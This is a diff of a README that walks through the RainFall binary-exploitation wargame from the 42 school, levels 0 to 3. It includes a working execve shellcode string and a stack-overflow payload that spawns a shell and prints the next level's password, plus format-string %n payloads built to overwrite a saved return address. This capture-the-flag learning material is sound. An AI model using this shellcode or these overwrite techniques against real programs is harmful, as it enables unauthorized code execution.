@@ -1,8 +1,23 @@
 # RainFall
 
-#### [Subject pdf](https://cdn.intra.42.fr/pdf/pdf/7092/fr.subject.pdf)
+```bash
+	  _____       _       ______    _ _
+	 |  __ \     (_)     |  ____|  | | |
+	 | |__) |__ _ _ _ __ | |__ __ _| | |
+	 |  _  /  _` | | '_ \|  __/ _` | | |
+	 | | \ \ (_| | | | | | | | (_| | | |
+	 |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|
 
-#### [Download ISO](https://projects.intra.42.fr/uploads/document/document/331/RainFall.iso)
+                 Good luck & Have fun
+```
+
+2nd security project of the 42 cursus, focused on binary exploitation
+
+#### - [Subject pdf 🇫🇷](https://cdn.intra.42.fr/pdf/pdf/9514/fr.subject.pdf)
+
+#### - [Download ISO](https://projects.intra.42.fr/uploads/document/document/331/RainFall.iso)
+
+The user/password to log for the 1st level will be `level0`/`level0`
 
 ## Level0
 
@@ -70,6 +85,10 @@ No !
 ```
 
 ```bash
+   0x08048ed9 <+25>:	cmp    $0x1a7,%eax ; Compare eax to 423
+```
+
+```bash
 level0@RainFall:~$ ./level0 423
 $ whoami
 level1
@@ -96,6 +115,7 @@ level1@RainFall:/home/user/level1$ cat .pass
 
 ## Level1
 
+- [`objdump -d` output](http://ix.io/2bqM)
 - [Why gets() should not be used](https://stackoverflow.com/questions/1694036/why-is-the-gets-function-so-dangerous-that-it-should-not-be-used)
 
 ```bash
@@ -131,8 +151,6 @@ level1@RainFall:~$ ./level1 <<< '123456789 123456789 123456789 123456789 1234567
 ```
 
 When running `objdump -d ./level1`, a `run` function using `system()` is showing.
-
-- [objdump output](http://ix.io/2bqM)
 
 When trying to run it in gdb, the function spawns a shell
 
@@ -242,9 +260,17 @@ cat /home/user/level2/.pass
 
 - [Stack base overflow tutorial](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)
 
+Some image of what we're doing here, replace `strcpy()` by `gets()`
+
 ![](https://www.corelan.be/wp-content/uploads/2010/09/image_thumb24.png)
 
+![](https://camo.githubusercontent.com/3862e2874666eb632fad1ab3f16b420b3c558344/68747470733a2f2f692e696d6775722e636f6d2f527868674459762e706e67)
+
+- (https://www.tenouk.com/Bufferoverflowc/Bufferoverflow3.html)
+    
 ## Level2
+
+- [`objdump -d` output]()
 
 ```bash
 gdb-peda$ disas main
@@ -269,11 +295,11 @@ Dump of assembler code for function p:
    0x080484e2 <+14>:    call   0x80483b0 <fflush@plt> ; fflush(STDOUT_FILENO);
    0x080484e7 <+19>:    lea    eax,[ebp-0x4c] ; Point eax to (ebp - 76) (28nth byte of the stack)
    0x080484ea <+22>:    mov    DWORD PTR [esp],eax ; Save eax
-   0x080484ed <+25>:    call   0x80483c0 <gets@plt> ; Call gets()
+   0x080484ed <+25>:    call   0x80483c0 <gets@plt> ; Call gets(ebp - 0x4c)
    0x080484f2 <+30>:    mov    eax,DWORD PTR [ebp+0x4] ; Set eax to return value of gets()
-   0x080484f5 <+33>:    mov    DWORD PTR [ebp-0xc],eax ; Set 92nth byte of the stack as eax
+   0x080484f5 <+33>:    mov    DWORD PTR [ebp-0xc],eax ; Set 92nth byte of the stack as the return value of gets()
    0x080484f8 <+36>:    mov    eax,DWORD PTR [ebp-0xc] ; Set eax as 92nth byte of the stack
-   0x080484fb <+39>:    and    eax,0xb0000000 ; Apply bitmask eax & 0xb0000000
+   0x080484fb <+39>:    and    eax,0xb0000000 ; Apply bitmask (eax & 0xb0000000)
    0x08048500 <+44>:    cmp    eax,0xb0000000 ; Check if higher byte of eax is >= '0xb0' && < '0xc0'
    0x08048505 <+49>:    jne    0x8048527 <p+83> ; If it\'s the case continue, print the string w/ printf() & exit, else goto <p+83>
 
@@ -287,7 +313,7 @@ Dump of assembler code for function p:
 
    0x08048527 <+83>:    lea    eax,[ebp-0x4c] ; Set eax to 28nth byte of the stack
    0x0804852a <+86>:    mov    DWORD PTR [esp],eax ; Set 1st argument of puts to eax
-   0x0804852d <+89>:    call   0x80483f0 <puts@plt> ; Call puts
+   0x0804852d <+89>:    call   0x80483f0 <puts@plt> ; Call puts(ebp-0x4c)
    0x08048532 <+94>:    lea    eax,[ebp-0x4c] ; Set eax to 28nth byte of the stack
    0x08048535 <+97>:    mov    DWORD PTR [esp],eax ; Set 1st argument of strdup() to eax
    0x08048538 <+100>:   call   0x80483e0 <strdup@plt> ; Call strdup()
@@ -295,28 +321,516 @@ Dump of assembler code for function p:
    0x0804853d <+105>:   leave ; ASM Epilogue
    0x0804853e <+106>:   ret ; ASM Epilogue
 End of assembler dump.
-
-gdb-peda$ printf "%s", 0x8048620
-(%p) 
 ```
 
-## Misc
+As we can see we're storing the output of gets() in to pointer to the 28h byte of the stack, which has a size limited to 104 bytes
+
+It's also important to note that we're executing printf("%p") instead of puts() & strdup() when the 92th byte of the stack is between 0xb0 and 0xbf
+
+Let's try to run this printf:
+
+```bash
+# To write what we want to the 92th byte of the stack, keep in mind that we're starting to write with gets() at index 28
+# To reach the end of our buffer we should then pass a string with a length of 76
+# EBP and EIP of the main() frame will be 4 bytes each, so to override both of them, we should pass (76 + 2*4) bytes
+# 
+
+level2@RainFall:~$ echo -n "abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijk$(echo -n -e '\xb0')" | wc -c
+84
+
+level2@RainFall:~$ echo -n "abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijk$(echo -n -e '\xb0')" > /tmp/lol
+
+level2@RainFall:~$ xxd /tmp/lol
+0000000: 6162 6364 6566 6768 696a 6b6c 6d6e 6f70  abcdefghijklmnop
+0000010: 7172 7374 7576 7778 797a 3031 3233 3435  qrstuvwxyz012345
+0000020: 3637 3839 6162 6364 6566 6768 696a 6b6c  6789abcdefghijkl
+0000030: 6d6e 6f70 7172 7374 7576 7778 797a 3031  mnopqrstuvwxyz01
+0000040: 3233 3435 3637 3839 6162 6364 6566 6768  23456789abcdefgh
+0000050: 696a 6bb0                                ijk.
+```
+
+```bash
+level2@RainFall:~$ gdb ./level2
+gdb-peda$ b *0x080484f2 # (After puts() call in p())
+
+gdb-peda$ run < /tmp/lol
+
+gdb-peda$ print $ebp
+$1 = (void *) 0xbffff6c8
+
+# $ebp - 4c = 0xbffff67d
+gdb-peda$ printf "%s", 0xbffff67d
+abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijk
+```
+
+We're hitting the printf() call !
+
+```bash
+level2@RainFall:~$ cat /tmp/lol  - | ./level2
+(0xb06b6a69)
+
+level2@RainFall:~$ echo $?
+1
+```
+
+Let's grab a random shellcode from the internet...
+
+```bash
+level2@RainFall:~$ echo -n "$(echo -n -e '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80')"$(perl -e 'print "A"x59')"$(echo -n -e '\x7d\xf6\xff\xbf')" > /tmp/lol
+
+level2@RainFall:~$ cat /tmp/lol | ./level2
+(0xbffff67d)
+```
+
+Unfortunaltely, the printf in the code prevent us from executing the shellcode in our string because its address begins by `\bf` like all other addresses of the program in the stack
+
+So I had to find something else !
+
+When doing an `objdump -d` on the program, we can see the function `__do_global_ctors_aux` used by the kernel makes a `call` instruction to `eax` to execute something stored in it
+
+![Linux startup callgraph](http://dbp-consulting.com/tutorials/debugging/images/callgraph.png)
+
+```bash
+080485d0 <__do_global_ctors_aux>:
+ 80485d0:       55                      push   %ebp
+ 80485d1:       89 e5                   mov    %esp,%ebp
+ 80485d3:       53                      push   %ebx
+ 80485d4:       83 ec 04                sub    $0x4,%esp
+ 80485d7:       a1 48 97 04 08          mov    0x8049748,%eax
+ 80485dc:       83 f8 ff                cmp    $0xffffffff,%eax
+ 80485df:       74 13                   je     80485f4 <__do_global_ctors_aux+0x24>
+ 80485e1:       bb 48 97 04 08          mov    $0x8049748,%ebx
+ 80485e6:       66 90                   xchg   %ax,%ax
+ 80485e8:       83 eb 04                sub    $0x4,%ebx
+ 80485eb:       ff d0                   call   *%eax
+ 80485ed:       8b 03                   mov    (%ebx),%eax
+ 80485ef:       83 f8 ff                cmp    $0xffffffff,%eax
+ 80485f2:       75 f4                   jne    80485e8 <__do_global_ctors_aux+0x18>
+ 80485f4:       83 c4 04                add    $0x4,%esp
+ 80485f7:       5b                      pop    %ebx
+ 80485f8:       5d                      pop    %ebp
+ 80485f9:       c3                      ret
+ 80485fa:       90                      nop
+ 80485fb:       90                      nop
+```
+
+I then tried to pass my shellcode in the input of the program like before, but passing the address of the `call eax` instruction in the `EIP` register instead of the address of our shellcode in the stack of the `p` function frame
+
+```bash
+level2@RainFall:~$ echo -n "$(echo -n -e '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80')"$(perl -e 'print "A"x59')"$(echo -n -e '\xeb\x85\x04\x08')" > /tmp/lol
+
+level2@RainFall:~$ cat /tmp/lol - | ./level2
+ls
+1Qh//shh/binAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAls
+ls
+ls: cannot open directory .: Permission denied
+whoami
+level3
+pwd
+/home/user/level2
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+```
+
+## Level3
+
+- [`objdump -d` output](http://ix.io/2bMn)
+
+```bash
+gdb-peda$ disas main
+Dump of assembler code for function main:
+   0x0804851a <+0>:     push   %ebp
+   0x0804851b <+1>:     mov    %esp,%ebp
+   0x0804851d <+3>:     and    $0xfffffff0,%esp
+   0x08048520 <+6>:     call   0x80484a4 <v>
+   0x08048525 <+11>:    leave
+   0x08048526 <+12>:    ret
+End of assembler dump.
+
+gdb-peda$ disas v
+Dump of assembler code for function v:
+   0x080484a4 <+0>:     push   %ebp ; ASM Prologue
+   0x080484a5 <+1>:     mov    %esp,%ebp ; ASM Prologue
+
+   0x080484a7 <+3>:     sub    $0x218,%esp ; Allocate 536 bytes on the stack
+   0x080484ad <+9>:     mov    0x8049860,%eax ; Move stdin@@GLIBC_2.0 to eax
+   0x080484b2 <+14>:    mov    %eax,0x8(%esp) ; Move stdin@@GLIBC_2.0 as 3rd argument of fgets()
+   0x080484b6 <+18>:    movl   $0x200,0x4(%esp) ; Move 512 as 2nd argument of fgets()
+   0x080484be <+26>:    lea    -0x208(%ebp),%eax ; Set eax to point to the (520th / 16th last) byte of the stack
+   0x080484c4 <+32>:    mov    %eax,(%esp) ; Set eax as 1st argument of fgets()
+   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt> ; Call fgets(ebp - 520, 512, stdin)
+    ;  char *fgets(char * restrict str, int size, FILE * restrict stream);
+   0x080484cc <+40>:    lea    -0x208(%ebp),%eax ; Set eax to point to the 16th byte of the stack
+   0x080484d2 <+46>:    mov    %eax,(%esp) ; Set eax as 1st argument of printf()
+   0x080484d5 <+49>:    call   0x8048390 <printf@plt> ; Call printf(eax)
+   0x080484da <+54>:    mov    0x804988c,%eax ; set eax to 0: printf "%x", *0x804988c -> "0" ; Also finds a function with this address, maybe a macro ?
+   0x080484df <+59>:    cmp    $0x40,%eax ; Check if eax is equal to 64
+   0x080484e2 <+62>:    jne    0x8048518 <v+116> ; If it\'s not the case, goto v+116 (return)
+
+   0x080484e4 <+64>:    mov    0x8049880,%eax ; Set eax to stdout@@GLIBC_2.0
+   0x080484e9 <+69>:    mov    %eax,%edx ; Set eax as 3rd argument of fwrite
+   0x080484eb <+71>:    mov    $0x8048600,%eax ; Set eax to 0x8048600 printf "%s", 0x8048600 -> Wait what?!
+   0x080484f0 <+76>:    mov    %edx,0xc(%esp) ; Set stdout@@GLIBC_2.0 as 4th argument
+   0x080484f4 <+80>:    movl   $0xc,0x8(%esp) ; Set 3rd argument to 12
+   0x080484fc <+88>:    movl   $0x1,0x4(%esp) ; Set 2nd argument to 1
+   0x08048504 <+96>:    mov    %eax,(%esp) ; Set eax as 1st argument
+   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt> ; fwrite(stdout, 1, 12);
+    ;      size_t fwrite(const void *restrict ptr, size_t size, size_t nitems, FILE *restrict stream);
+   0x0804850c <+104>:   movl   $0x804860d,(%esp) ; Set 1st argument of system() to "/bin/sh": printf "%s", 0x804860d -> /bin/sh
+   0x08048513 <+111>:   call   0x80483c0 <system@plt> ; Call system("/bin/sh")
+
+   0x08048518 <+116>:   leave ; ASM Epilogue
+   0x08048519 <+117>:   ret ; ASM Epilogue
+End of assembler dump.
+
+gdb-peda$ disas 0x8049860
+Dump of assembler code for function stdin@@GLIBC_2.0:
+   0x08049860 <+0>:     add    %al,(%eax)
+   0x08049862 <+2>:     add    %al,(%eax)
+End of assembler dump.
+
+gdb-peda$ disas 0x8049880
+Dump of assembler code for function stdout@@GLIBC_2.0:
+   0x08049880 <+0>:     add    %al,(%eax)
+   0x08049882 <+2>:     add    %al,(%eax)
+End of assembler dump.
+```
+
+Equivalent C code:
+
+```cpp
+// level3@RainFall:~$ cat /tmp/lol.c
+#include <stdio.h>
+
+# define z 0
+
+void    v(void) {
+        unsigned int eax;
+        unsigned char buf[532];
+
+        fgets(buf + 520, 512, stdin);
+        eax = printf(buf + 520);
+        eax = z;
+        if (eax == 0x40)
+        {
+                fwrite("Wait what?!\n", 1, 12, stdout);
+                system("/bin/sh");
+        }
+}
+
+int     main(void) {
+        v();
+        return (0);
+}
+```
+
+```bash
+level3@RainFall:~$ ./level3
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+level3@RainFall:~$ ./level3
+%p
+0x200
+```
+
+- [Printf vulns example](https://blog.skullsecurity.org/2015/defcon-quals-babyecho-format-string-vulns-in-gory-detail)
+
+```bash
+level3@RainFall:~$ ./level3 <<< '%x %x %x %x %x'
+200 b7fd1ac0 b7ff37d0 25207825 78252078
+
+level3@RainFall:~$ ./level3 <<< 'AAAABBBBCCCC%x %x %x %x %x'
+AAAABBBBCCCC200 b7fd1ac0 b7ff37d0 41414141 42424242
+
+level3@RainFall:~$ ./level3 <<< 'AAAABBBBCCCC%x %x %x %x %x %x'
+AAAABBBBCCCC200 b7fd1ac0 b7ff37d0 41414141 42424242 43434343
+```
+
+```bash
+level3@RainFall:~$ ./level3 <<< 'AAAA %4$x'
+AAAA 41414141
+
+level3@RainFall:~$ ./level3 <<< 'AAAA %4$s'
+Segmentation fault (core dumped)
+```
+
+We can read our own string ! Let's try to read return address to the printf() function call to `0x080484da`:
+
+```bash
+gdb-peda$ disas v
+...
+   0x080484d2 <+46>:    mov    %eax,(%esp)
+   0x080484d5 <+49>:    call   0x8048390 <printf@plt>
+   0x080484da <+54>:    mov    0x804988c,%eax
+...
+```
+
+```bash
+gdb-peda$ b printf
+
+gdb-peda$ run <<< 'AAAA%4$x'
+
+gdb-peda$ si
+gdb-peda$ si # Pass ASM Prologue of printf
+
+gdb-peda$ x/100c $esp
+0xbffff4d0:     0x8     0xf7    0xff    0xbf    0xb0    0x26    0xff    0xb7
+0xbffff4d8:     0xc4    0x28    0xfd    0xb7    0x50    0x88    0xe7    0xb7
+0xbffff4e0:     0x0     0xf5    0xff    0xbf    0x18    0xf9    0xff    0xb7
+0xbffff4e8:     0xf4    0xf     0xfd    0xb7   [0xda    0x84    0x4     0x8] # return address
+0xbffff4f0:     0x0     0xf5    0xff    0xbf    0x0     0x2     0x0     0x0  # fgets() 16 bytes offset to end in stack
+0xbffff4f8:     0xc0    0x1a    0xfd    0xb7    0xd0    0x37    0xff    0xb7 # fgets() 16 bytes offset to end in stack
+0xbffff500:    [0x41    0x41    0x41    0x41]   0x25    0x34    0x24    0x78 # "AAAA%4$x"
+0xbffff508:     0xa     0x0     0x0     0x0     0x5     0xf3    0xfe    0xb7 # "\n\0\0\0", the newline added by the shell
+0xbffff510:     0x68    0xf5    0xff    0xbf    0xd4    0xe2    0xfd    0xb7
+0xbffff518:     0x34    0xe3    0xfd    0xb7    0x7     0x0     0x0     0x0
+0xbffff520:     0x0     0x0     0x0     0x0     0x0     0xe0    0xfd    0xb7
+0xbffff528:     0x3c    0xf5    0xff    0xb7    0x68    0xf5    0xff    0xbf
+0xbffff530:     0x40    0x0     0x0     0x0
+
+gdb-peda$ continue
+AAAA41414141
+[Inferior 1 (process 8495) exited normally]
+```
+
+Or the return address of v & the offset with the beginning of the fgets input:
+
+```bash
+level3@RainFall:~$ python -c "print 'A'*4" > /tmp/input; cat /tmp/input
+AAAA
+
+level3@RainFall:~$ gdb ./level3
+(gdb) disas main
+Dump of assembler code for function main:
+   0x0804851a <+0>:     push   %ebp
+   0x0804851b <+1>:     mov    %esp,%ebp
+   0x0804851d <+3>:     and    $0xfffffff0,%esp
+   0x08048520 <+6>:     call   0x80484a4 <v>
+   0x08048525 <+11>:    leave
+   0x08048526 <+12>:    ret
+End of assembler dump.
+(gdb) b *0x08048520
+Breakpoint 1 at 0x8048520
+(gdb) disas v
+Dump of assembler code for function v:
+   0x080484a4 <+0>:     push   %ebp
+   0x080484a5 <+1>:     mov    %esp,%ebp
+   ...
+   0x080484c4 <+32>:    mov    %eax,(%esp)
+   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
+   0x080484cc <+40>:    lea    -0x208(%ebp),%eax
+   ...
+   0x08048519 <+117>:   ret
+End of assembler dump.
+(gdb) b *0x080484cc
+Breakpoint 2 at 0x80484cc
+(gdb) run  < /tmp/input
+
+(gdb) run  < /tmp/input
+Starting program: /home/user/level3/level3 < /tmp/input
+
+Breakpoint 1, 0x08048520 in main ()
+(gdb) i r
+eax            0x1      1
+ecx            0xbffff744       -1073744060
+....
+esi            0x0      0
+edi            0x0      0
+[eip            0x8048520        0x8048520 <main+6>]
+
+(gdb) continue
+
+(gdb) find $esp,0xbfffffff,0x08048525
+0xbffff69c
+1 pattern found.
+
+(gdb) find $esp,0xbfffffff,0x41414141
+0xbffff490
+1 pattern found.
+```
+
+Now let's try to find saved eip from main() for fun:
+
+```bash
+level3@RainFall:~$ for i in $(seq 1 10); do echo -n "$i: "; echo -n -e "%$i\$x" | ./level3; echo; done;
+1: 200
+2: b7fd1ac0
+3: b7ff37d0
+4: 2434255c
+5: b7e20078
+6: 1
+7: b7fef305
+8: bffff518
+9: b7fde2d4
+10: b7fde334
+
+# Not there ... let's try with a bigger range
+level3@RainFall:~$ (for i in $(seq 1 500); do echo -n "$i: "; echo -n -e "%$i\$x" | ./level3; echo; done;) | grep 8048525
+135: 8048525
+```
+
+### Rewriting EIP
+
+To make the program run the if() condition containing the system() call, we'll try to rewrite a saved EIP pointer,
+
+To do this we can try to make the program segfault, look at the backtrace (where function calls happened) and try to rewrite these addresses in the memory of the program
+
+```bash
+level3@RainFall:~$ echo -n -e 'AAAA%4$x'> /tmp/input ; cat /tmp/input  | ./level3
+AAAA41414141
+
+level3@RainFall:~$ echo -n -e 'AAAA%4$s' > /tmp/input
+
+level3@RainFall:~$ gdb ./level3
+...
+(gdb) run < /tmp/input
+Starting program: /home/user/level3/level3 < /tmp/input
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7e70003 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+(gdb) bt
+#0  0xb7e70003 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+#1  0xb7e7887f in printf () from /lib/i386-linux-gnu/libc.so.6
+#2  0x080484da in v ()
+#3  0x08048525 in main ()
+
+(gdb) find $esp,0xbfffffff,0xb7e70003
+Pattern not found.
+
+(gdb) find $esp,0xbfffffff,0xb7e7887f
+0xbffff45c
+1 pattern found.
+
+(gdb) find $esp,0xbfffffff,0x080484da
+0xbffff47c
+1 pattern found.
+
+(gdb) find $esp,0xbfffffff,0x08048525
+0xbffff69c
+1 pattern found.
+```
+
+Now that we have the locations of the saved EIP pointers, let's try to rewrite one using the `%n` feature of printf (which saves the number of printed characters to the passed argument)
+
+```bash
+level3@RainFall:~$ echo -n -e '\x5c\xf4\xff\xbf%4$n' > /tmp/input
+
+level3@RainFall:~$ gdb ./level3
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/user/level3/level3...(no debugging symbols found)...done.
+(gdb) run < /tmp/input
+Starting program: /home/user/level3/level3 < /tmp/input
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000004 in ?? ()
+```
+
+Bingo! The address got overwritten, now let's write the address that we want to jump to, `0x080484e4`
+
+`0x080484e4` == `134513892`, -4 for first 4 bytes
+
+Although it may work, we don't have to write this much bytes to overwrite EIP with the value we want
+
+We can instead use multiple `%n` values with the address of each byte in the 4byte address integer
+
+```bash
+level3@RainFall:~$ echo -n -e '\x5c\xf4\xff\xbf''\x5d\xf4\xff\xbf''\x5e\xf4\xff\xbf''\x5f\xf4\xff\xbf''%10x%4$n' > /tmp/input
+
+level3@RainFall:~$ gdb ./level3
+...
+(gdb) run < /tmp/input
+Starting program: /home/user/level3/level3 < /tmp/input
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000001a in ?? ()
+
+level3@RainFall:~$ echo -n -e '\x5c\xf4\xff\xbf''\x5d\xf4\xff\xbf''\x5e\xf4\xff\xbf''\x5f\xf4\xff\xbf''%10x%4$n''%10x%5$n' > /tmp/input
+
+level3@RainFall:~$ gdb ./level3
+...
+(gdb) run < /tmp/input
+Starting program: /home/user/level3/level3 < /tmp/input
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000241a in ?? ()
+```
+
+```bash
+level3@RainFall:~$ echo -n -e '\x5c\xf4\xff\xbf''\x5d\xf4\xff\xbf''\x5e\xf4\xff\xbf''\x5f\xf4\xff\xbf''%212x%4$n' > /tmp/input
+level3@RainFall:~$ gdb ./level3
+...
+(gdb) run < /tmp/input
+Starting program: /home/user/level3/level3 < /tmp/input
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000000e4 in ?? ()
+
+# For the 2nd byte (0x84 / 132): add 132 to (256 - 228)
+
+level3@RainFall:~$ echo -n -e '\x5c\xf4\xff\xbf''\x5d\xf4\xff\xbf''\x5e\xf4\xff\xbf''\x5f\xf4\xff\xbf''%212x%4$n''%160x%5$n' > /tmp/input
+
+level3@RainFall:~$ gdb ./level3
+...
+(gdb) run < /tmp/input
+Starting program: /home/user/level3/level3 < /tmp/input
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000184e4 in ?? ()
+
+# For the 3rd byte (0x04 / 4): add 4 to (256 - 132)
+
+level3@RainFall:~$ echo -n -e '\x5c\xf4\xff\xbf''\x5d\xf4\xff\xbf''\x5e\xf4\xff\xbf''\x5f\xf4\xff\xbf''%212x%4$n''%160x%5$n''%127x%6$n' > /tmp/input
+level3@RainFall:~$ gdb ./level3
+...
+(gdb) run </tmp/input
+Starting program: /home/user/level3/level3 </tmp/input
+
+Program received signal SIGSEGV, Segmentation fault.
+0x020384e4 in ?? ()
+
+# For the 4th byte (0x08 / 8): add 4 to 256
+
+level3@RainFall:~$ echo -n -e '\x5c\xf4\xff\xbf''\x5d\xf4\xff\xbf''\x5e\xf4\xff\xbf''\x5f\xf4\xff\xbf''%212x%4$n''%160x%5$n''%128x%6$n''%260x%7$n' > /tmp/input
+level3@RainFall:~$ gdb ./level3
+...
+(gdb) run < /tmp/input
+Starting program: /home/user/level3/level3 < /tmp/input
+\�]�^�_�                                                                                                                                                                                                                 200                                                                                                                                                        b7fd1ac0                                                                                                                        b7ff37d0                                                                                                                                                                                                                                                            bffff45cWait what?!
+[Inferior 1 (process 28545) exited normally]
+```
+
+Yay! We hit the printf() call, but it didn't work, lets put directly the address before the system() call (`0x0804850c`)
+
+```bash
+level3@RainFall:~$ echo -n -e '\x5c\xf4\xff\xbf''\x5d\xf4\xff\xbf''\x5e\xf4\xff\xbf''\x5f\xf4\xff\xbf''%252x%4$n''%121x%5$n''%127x%6$n''%260x%7$n' > /tmp/input
+
+level3@RainFall:~$ cat /tmp/input  | ./level3
+\�]�^�_�                                                                                                                                                                                                                                                         200                                                                                                                 b7fd1ac0                                                                                                                       b7ff37d0                                                                                                                                                                                                                                                            bffff45c
+```
+
+Todo: redact this
+
+
+## Misc / References
 
 ### ASM Cheatsheets
 
 - [Registers usage](http://6.s081.scripts.mit.edu/sp18/x86-64-architecture-guide.html)
-
 - [ASM Operations](https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf)
-
 - [Linux Syscall Table](https://filippo.io/linux-syscall-table/)
-
 - [Att vs Intel syntax](https://imada.sdu.dk/~kslarsen/Courses/dm546-2019-spring/Material/IntelnATT.htm)
+- [Linux startup callgraph](http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html)
 
 ![](https://www.tortall.net/projects/yasm/manual/html/objfmt-win64/calling-convention.png)
-
-- [Linux program startup](http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html)
-
-![](http://dbp-consulting.com/tutorials/debugging/images/callgraph.png)
 
 ### ASM Returns
 
